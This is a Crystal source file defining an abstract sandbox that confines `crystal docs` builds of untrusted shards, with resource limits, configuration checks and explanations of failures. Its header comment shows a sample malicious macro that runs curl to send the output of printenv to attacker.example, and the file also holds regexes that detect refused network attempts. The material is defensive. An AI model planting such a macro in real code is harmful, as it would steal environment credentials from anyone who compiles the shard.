require "json"

module CrystalShards
  # Runs `crystal docs` on untrusted source.
  #
  # Building documentation for a third-party shard means compiling code we did
  # not write, and Crystal expands macros during that compile. A shard whose
  # source contains a top-level macro statement such as
  #
  #     {% `curl -s -d "$(printenv)" https://attacker.example` %}
  #
  # executes that command inside whatever process runs `crystal docs`. Nobody
  # has to install or run the shard; indexing it is enough. So the compile step
  # is treated as hostile code execution and is confined, while the steps that
  # need credentials or the network (cloning, dependency fetching, uploading)
  # stay outside and never run untrusted code.
  #
  # A sandbox implementation must guarantee, at minimum:
  #
  #   * no environment inherited from the caller, so credentials cannot be read
  #   * no network, so nothing can be exfiltrated or fetched
  #   * an unprivileged user, no capabilities, no privilege escalation
  #   * a writable area that is not the host filesystem
  #   * cpu, memory, pid and wall-clock ceilings
  abstract class DocsSandbox
    class Unavailable < Exception; end

    # Generates documentation from `source_dir` into `output_dir`.
    # Returns false when the build failed; raises `Unavailable` when the
    # sandbox itself could not be started.
    #
    # "Failed" covers more than a non-zero exit: the build writes exactly one
    # artifact, `docs.json`, and `crystal docs` can exit 0 having written
    # nothing useful. A build that did not leave a parseable, non-empty
    # docs.json behind did not succeed.
    abstract def build_docs(source_dir : String, output_dir : String) : Bool

    # Human-readable description used in logs, so it is always obvious from
    # the log which confinement a build actually ran under.
    abstract def description : String

    # The Crystal version this sandbox will compile with.
    #
    # An instance method, not just the class one, because it is the sandbox
    # that knows. The launcher passes this to `shards install` so dependencies
    # resolve for the compiler that is about to compile them, and the
    # unsandboxed sandbox does not use the image at all.
    def crystal_version : String
      DocsSandbox.crystal_version
    end

    # The one artifact a build is expected to leave in `output_dir`.
    DOCS_JSON = "docs.json"

    # Whether `path` holds a usable documentation artifact: present, non-empty
    # and parseable as JSON. Anything less is a failed build, whatever the
    # compiler's exit status said.
    def self.valid_docs_json?(path : String) : Bool
      return false unless File.exists?(path)
      return false unless File.size(path) > 0

      JSON.parse(File.read(path))
      true
    rescue JSON::ParseException
      false
    end

    # Why the last build failed, in words the shard's maintainer can act on.
    #
    # `build_docs` returning false is enough for the launcher to record a
    # failure. It is not enough to record a USEFUL one, and that gap got worse
    # the day the compile lost its network: the reader was told "usually the
    # shard does not compile against the Crystal version it declared" while
    # the real cause was a macro fetching at compile time. A maintainer needs
    # to be told that, and we are entitled to say we refused on purpose.
    getter failure_reason : String? = nil

    protected def record_failure(reason : String) : Bool
      @failure_reason = reason
      log_error reason
      false
    end

    # Evidence that a compile reached for the network, as opposed to a guess.
    #
    # EAFNOSUPPORT is what the sandbox's seccomp filter returns for a routable
    # socket, ENETUNREACH is what an empty network namespace returns once the
    # socket exists, and curl's 6 and 7 are "could not resolve" and "could not
    # connect". Nothing else in a documentation build produces any of them, so
    # matching one is a fact rather than an inference.
    NETWORK_REFUSED = /Address family not supported by protocol|Network is unreachable|Could not resolve host|curl: \(6\)|curl: \(7\)/

    # Weaker: Crystal says this when a macro shells out and the command exits
    # non-zero. The command may have wanted the network or may simply be
    # broken, so this earns a different sentence.
    MACRO_COMMAND_FAILED = /error executing command:|Error executing run:/

    NO_NETWORK_EXPLANATION = <<-TEXT
      Compiling a shard runs its macros, so a documentation build that is allowed to
      make requests is a build any published shard can use to reach our infrastructure.
      Documentation is therefore compiled with no network access at all: no outbound
      connection, no name resolution, no metadata server. Refusing this is deliberate.

      A macro that reads from the network at compile time has to stop doing that, or
      tolerate the request failing. Note that a macro backtick raises when its command
      exits non-zero, so silencing the output is not enough; the command itself has to
      succeed, as in `curl ... || true`.
      TEXT

    # Reads the build's own output the same way the sandbox container reads
    # its compiler log, for the sandboxes that can see it directly.
    protected def explain(output : String) : String
      excerpt = output.lines.last(40).join("\n")

      headline =
        if NETWORK_REFUSED.matches?(output)
          "This shard tried to use the network while it was being compiled, and the attempt was refused."
        elsif MACRO_COMMAND_FAILED.matches?(output)
          "This shard did not compile. The compiler reports that a command run by one of its macros failed."
        else
          return "This shard did not compile.\n\ncrystal docs said:\n\n#{excerpt}"
        end

      "#{headline}\n\n#{NO_NETWORK_EXPLANATION}\n\ncrystal docs said:\n\n#{excerpt}"
    end

    # Test seam. When set, `build` returns this proc's result.
    class_property builder : Proc(DocsSandbox)? = nil

    # Must track the toolchain this platform builds with. A shard whose code
    # uses anything newer than the sandbox's compiler fails to document for a
    # reason that has nothing to do with the shard.
    DEFAULT_IMAGE   = "crystallang/crystal:1.21.0-alpine"
    DEFAULT_TIMEOUT = 900
    DEFAULT_MEMORY  = "2Gi"
    DEFAULT_CPUS    = "2"
    DEFAULT_PIDS    = 256

    def self.build : DocsSandbox
      if custom = @@builder
        return custom.call
      end

      case ENV.fetch("DOCS_SANDBOX", "").downcase
      when "docker"
        DockerDocsSandbox.new
      when "cloudrun"
        CloudRunJobDocsSandbox.new
      when "none", ""
        unsandboxed
      else
        raise Unavailable.new(
          "Unknown DOCS_SANDBOX #{ENV["DOCS_SANDBOX"]?.inspect}. " \
          "Expected docker, cloudrun or none."
        )
      end
    end

    # Refusing is the safe default. Building documentation without a sandbox
    # hands shard authors command execution in a process that holds storage
    # and database credentials, so it has to be asked for explicitly and can
    # only ever be a local development choice.
    private def self.unsandboxed : DocsSandbox
      unless ENV["DOCS_SANDBOX_ALLOW_UNSAFE"]? == "true"
        raise Unavailable.new(
          "Refusing to build documentation without a sandbox. Building runs " \
          "untrusted shard code with compile-time command execution. Set " \
          "DOCS_SANDBOX=docker (or cloudrun), or set " \
          "DOCS_SANDBOX_ALLOW_UNSAFE=true for local development only."
        )
      end

      UnsandboxedDocsSandbox.new
    end

    IMAGE_ENV = "DOCS_SANDBOX_IMAGE"

    def self.image : String
      ENV.fetch(IMAGE_ENV, DEFAULT_IMAGE)
    end

    # The compiler version the sandbox is going to compile with.
    #
    # `shards install` shells out to `crystal` once, after writing the lock,
    # only to learn the compiler version. The launcher image has no compiler
    # in it and no reason to grow one, so that call fails and takes the
    # dependency install with it. Putting CRYSTAL_VERSION in the child's
    # environment removes the call entirely.
    #
    # It is derived from the sandbox image and never configured separately.
    # Dependencies have to be resolved for the compiler that is going to
    # compile them, and a second setting would be two values that must agree
    # with nothing in the system able to make them agree. Whoever changes the
    # image changes the resolution, in one place, by definition.
    # Anchored, and applied only to the final path segment. A registry host
    # can carry a port and a repository path can carry dots, so searching the
    # whole string finds "1.2.3" in `registry:1.2.3/crystal:latest` and
    # reports a version this build is never going to use.
    IMAGE_VERSION = /\A[^:@\/]+:v?(\d+\.\d+\.\d+)(?:-[A-Za-z0-9.]+)?\z/

    class UnreadableImageVersion < Exception
      def initialize(image : String)
        super(
          "Cannot read a Crystal version out of #{IMAGE_ENV}=#{image.inspect}. The launcher " \
          "passes this version to `shards install` so dependencies resolve for the compiler " \
          "that will compile them, so it is not something to guess at. Use an image tagged " \
          "with a version, as in #{DEFAULT_IMAGE}."
        )
      end
    end

    def self.crystal_version : String
      current = image
      match = IMAGE_VERSION.match(current.rpartition('/')[2])
      raise UnreadableImageVersion.new(current) unless match

      match[1]
    end

    TIMEOUT_ENV = "DOCS_SANDBOX_TIMEOUT_SECONDS"

    # The launcher must outlive the sandbox, and this is what enforces it.
    #
    # The launcher holds the Cloud Tasks request open for the whole build and
    # is the only party in the chain holding a database credential. If the
    # sandbox is allowed to run as long as the launcher's own deadline, the
    # launcher is killed mid-wait having written nothing: the request row
    # stays `building` forever, no failed_at is written so the retry floor has
    # nothing to measure from, nothing ever reconsiders the version, and no
    # log line says why. An orphaned build is invisible rather than noisy,
    # which is why the ordering is checked here rather than trusted.
    #
    # The margin is not padding. It has to cover the work the launcher does
    # outside the sandbox wait: clone, checkout, `shards install`, then
    # downloading the artifact, validating it parses, publishing it and
    # writing status. `shards install` on a dependency-heavy shard is the slow
    # one.
    #
    # Terraform derives this from the same variable as the deadline, minus an
    # explicit margin, so the ordering is structural. This refuses at config
    # time if that ever stops being true, naming both variables, rather than
    # letting it surface as a build that hangs.
    MIN_LAUNCHER_MARGIN_SECONDS = 300

    class TimeoutOrdering < Exception
      def initialize(sandbox : Int32, deadline : Int32)
        super(
          "#{TIMEOUT_ENV} is #{sandbox}s and #{CloudTasksConfig::DEADLINE_ENV} is #{deadline}s. " \
          "The sandbox must finish at least #{MIN_LAUNCHER_MARGIN_SECONDS}s before the launcher's " \
          "deadline, so the launcher survives to record the outcome. Lower #{TIMEOUT_ENV} " \
          "or raise #{CloudTasksConfig::DEADLINE_ENV}."
        )
      end
    end

    def self.timeout_seconds : Int32
      seconds = ENV[TIMEOUT_ENV]?.try(&.to_i?) || DEFAULT_TIMEOUT
      deadline = CloudTasksConfig.deadline_seconds

      raise TimeoutOrdering.new(seconds, deadline) if seconds + MIN_LAUNCHER_MARGIN_SECONDS > deadline

      seconds
    end

    def self.memory : String
      ENV.fetch("DOCS_SANDBOX_MEMORY", DEFAULT_MEMORY)
    end

    def self.cpus : String
      ENV.fetch("DOCS_SANDBOX_CPUS", DEFAULT_CPUS)
    end

    def self.pids : Int32
      ENV["DOCS_SANDBOX_PIDS"]?.try(&.to_i?) || DEFAULT_PIDS
    end

    protected def log_info(message : String)
      Log.info { "#{self.class.name}: #{message}" }
    end

    protected def log_error(message : String)
      Log.error { "#{self.class.name}: #{message}" }
    end
  end
end

require "./docs_sandbox/*"
